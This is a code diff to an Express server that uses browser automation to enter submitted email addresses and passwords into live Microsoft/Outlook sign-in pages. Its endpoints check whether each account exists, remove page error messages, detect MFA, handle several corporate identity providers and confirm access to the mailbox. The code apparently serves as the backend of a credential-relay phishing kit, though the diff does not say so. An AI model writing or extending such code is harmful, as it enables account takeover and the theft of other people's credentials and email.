@@ -346,24 +346,39 @@ app.post('/api/login', async (req, res) => {
 
         // Force fresh login - no checking for existing sessions
 
-        // If password is provided, navigate to email interface for scanning
+        // If password is provided, perform full login
         if (password) {
-            console.log('🔐 Proceeding to email interface...');
+            let loginSuccess = false;
+            let authMethod = 'password';
 
-            const navigated = await session.automation.navigateToEmailInterface();
-            
-            // Take screenshot after navigation
-            await session.automation.takeScreenshot(`screenshots/session-${sessionId}-email-interface.png`);
+            console.log('🔐 Proceeding with password login...');
+
+            // If cookie auth failed, do full password login
+            if (!loginSuccess) {
+                console.log('🔐 Performing full password login...');
+                loginSuccess = await session.automation.performLogin(email, password);
+                authMethod = 'password';
+
+                // Login successful - no cookie saving
+                if (loginSuccess) {
+                    console.log('✅ Login completed successfully');
+                }
+            }
+
+            // Take screenshot after login attempt
+            await session.automation.takeScreenshot(`screenshots/session-${sessionId}-login.png`);
 
             res.json({
                 sessionId: sessionId,
                 email: email,
                 loginComplete: true,
-                loginSuccess: navigated,
-                authMethod: 'email-scanning',
-                message: navigated ? 'Ready for email scanning' : 'Unable to access email interface',
+                loginSuccess: loginSuccess,
+                authMethod: authMethod,
+                message: loginSuccess ? 
+                    (authMethod === 'cookies' ? 'Login successful using saved cookies!' : 'Login successful with password! Enhanced session saved.') : 
+                    'Login failed or additional authentication required',
                 screenshots: [
-                    `screenshots/session-${sessionId}-email-interface.png`
+                    `screenshots/session-${sessionId}-login.png`
                 ]
             });
         } else {
@@ -403,17 +418,81 @@ app.post('/api/login', async (req, res) => {
 
                 // Check for different scenarios
 
-                // Navigate to email interface for scanning
-                console.log('Navigating to email interface for email scanning...');
-                const navigated = await session.automation.navigateToEmailInterface();
-                
-                if (navigated) {
-                    siteReport.siteResponse = 'Ready for email scanning';
+                // Check for password field (account exists)
+                const passwordField = await session.automation.page.$('input[type="password"]');
+                if (passwordField) {
+                    siteReport.needsPassword = true;
                     siteReport.accountExists = true;
-                    console.log('Email interface accessible');
-                } else {
-                    siteReport.siteResponse = 'Unable to access email interface';
-                    console.log('Email interface not accessible');
+                    siteReport.siteResponse = 'Password field appeared - account exists and is ready for password entry';
+                    console.log('Password field detected - account exists');
+                }
+
+                // Remove bordered error messages from HTML and only capture specific "account not found" error
+                const errorSelectors = [
+                    '[role="alert"]',
+                    '.error',
+                    '.ms-TextField-errorMessage',
+                    '[data-testid="error"]',
+                    '.alert-error',
+                    '[aria-live="polite"]',
+                    '.form-error'
+                ];
+
+                let foundAccountNotFoundError = false;
+                for (let selector of errorSelectors) {
+                    const errorElements = await session.automation.page.$$(selector);
+                    for (let element of errorElements) {
+                        try {
+                            const errorText = await element.evaluate(el => el.textContent);
+                            if (errorText && errorText.trim()) {
+                                // Only capture the specific "account not found" error message
+                                if (errorText.includes("We couldn't find an account with that username")) {
+                                    siteReport.errorMessages.push(errorText.trim());
+                                    console.log(`Found error message: ${errorText.trim()}`);
+                                    foundAccountNotFoundError = true;
+                                } else {
+                                    // Remove all other bordered error messages from HTML
+                                    await element.evaluate(el => el.remove());
+                                }
+                            }
+                        } catch (e) {
+                            // Skip if can't get text
+                        }
+                    }
+                }
+
+                // If account not found error, reload the page to reset the form
+                if (foundAccountNotFoundError) {
+                    console.log('Account not found error detected - reloading Outlook page for retry...');
+
+                    // Navigate back to Outlook to reset the form
+                    const reloaded = await session.automation.navigateToOutlook();
+                    if (!reloaded) {
+                        siteReport.siteResponse = 'Failed to reload page after account error';
+                    } else {
+                        siteReport.siteResponse = 'Page reloaded - ready for new email attempt';
+                        siteReport.needsPassword = false;
+                        siteReport.accountExists = false;
+                        console.log('Page successfully reloaded and ready for new email');
+                    }
+                }
+
+                // Check for MFA/2FA prompts
+                const mfaSelectors = [
+                    'input[type="tel"]',
+                    '[data-testid="phone"]', 
+                    '[data-testid="authenticator"]',
+                    '.verification'
+                ];
+
+                for (let selector of mfaSelectors) {
+                    const mfaElement = await session.automation.page.$(selector);
+                    if (mfaElement) {
+                        siteReport.needsMFA = true;
+                        siteReport.siteResponse = 'Multi-factor authentication required';
+                        console.log('MFA prompt detected');
+                        break;
+                    }
                 }
 
                 // If no specific response detected, get general page content
@@ -452,9 +531,11 @@ app.post('/api/login', async (req, res) => {
                 email: email,
                 loginComplete: false,
                 siteReport: siteReport,
-                message: siteReport.accountExists ? 
-                    'Email interface accessible - ready for scanning.' : 
-                    'Email interface not accessible - see site report for details.',
+                message: siteReport.needsPassword ? 
+                    'Email verified! Account exists and is ready for password.' : 
+                    siteReport.errorMessages.length > 0 ? 
+                    'Issues detected with email - see site report for details.' :
+                    'Email processed - see site report for response.',
                 screenshots: [
                     `screenshots/session-${sessionId}-after-next.png`
                 ]
@@ -490,7 +571,102 @@ app.post('/api/login', async (req, res) => {
     }
 });
 
-// Continue endpoint removed - no longer needed for email scanning only
+// Continue with password (for cases where email was filled first)
+app.post('/api/continue-login', async (req, res) => {
+    try {
+        const { password, sessionId: requestedSessionId } = req.body;
+
+        if (!password) {
+            return res.status(400).json({ 
+                error: 'Password is required' 
+            });
+        }
+
+        if (!activeSession || !activeSession.automation) {
+            return res.status(400).json({ 
+                error: 'No active session. Please start with email first.' 
+            });
+        }
+
+        console.log('Continuing login with password...');
+
+        // Continue the login process with provider detection
+        try {
+            // Detect the current login provider
+            const loginProvider = await activeSession.automation.detectLoginProvider();
+            console.log(`Detected login provider for password entry: ${loginProvider}`);
+
+            // Handle password entry based on the provider
+            let passwordSuccess = false;
+
+            if (loginProvider === 'microsoft') {
+                passwordSuccess = await activeSession.automation.handleMicrosoftLogin(password);
+            } else if (loginProvider === 'adfs') {
+                passwordSuccess = await activeSession.automation.handleADFSLogin(password);
+            } else if (loginProvider === 'okta') {
+                passwordSuccess = await activeSession.automation.handleOktaLogin(password);
+            } else if (loginProvider === 'azure-ad') {
+                passwordSuccess = await activeSession.automation.handleAzureADLogin(password);
+            } else if (loginProvider === 'generic-saml') {
+                passwordSuccess = await activeSession.automation.handleGenericSAMLLogin(password);
+            } else {
+                console.warn(`Unknown login provider in continue-login. Attempting generic login...`);
+                passwordSuccess = await activeSession.automation.handleGenericLogin(password);
+            }
+
+            if (!passwordSuccess) {
+                console.warn('Password login attempt failed, but continuing with flow...');
+            }
+
+            // Take screenshot after password submission
+            await activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-after-password.png`);
+            console.log(`Screenshot saved after password submission`);
+
+            // Handle "Stay signed in?" prompt
+            await activeSession.automation.handleStaySignedInPrompt();
+
+            // Wait a bit more after handling the prompt
+            await new Promise(resolve => setTimeout(resolve, 3000));
+
+            // Take screenshot after login
+            await activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-final.png`);
+
+            // Check if we're successfully logged in
+            const currentUrl = activeSession.automation.page.url();
+            const loginSuccess = currentUrl.includes('outlook.office.com/mail');
+
+            let responseMessage = '';
+            if (loginSuccess) {
+                responseMessage = 'Login completed successfully!';
+            } else {
+                responseMessage = 'Login may require additional verification';
+            }
+
+            res.json({
+                sessionId: activeSession.sessionId,
+                loginComplete: true,
+                loginSuccess: loginSuccess,
+                message: responseMessage,
+                screenshot: `screenshots/session-${activeSession.sessionId}-final.png`,
+                passwordScreenshot: `screenshots/session-${activeSession.sessionId}-after-password.png`
+            });
+
+        } catch (error) {
+            console.error('Error during password entry:', error);
+            res.status(500).json({ 
+                error: 'Failed to complete login',
+                details: error.message 
+            });
+        }
+
+    } catch (error) {
+        console.error('Error in continue-login:', error);
+        res.status(500).json({ 
+            error: 'Continue login failed',
+            details: error.message 
+        });
+    }
+});
 
 // Take screenshot of current state
 app.post('/api/screenshot', async (req, res) => {
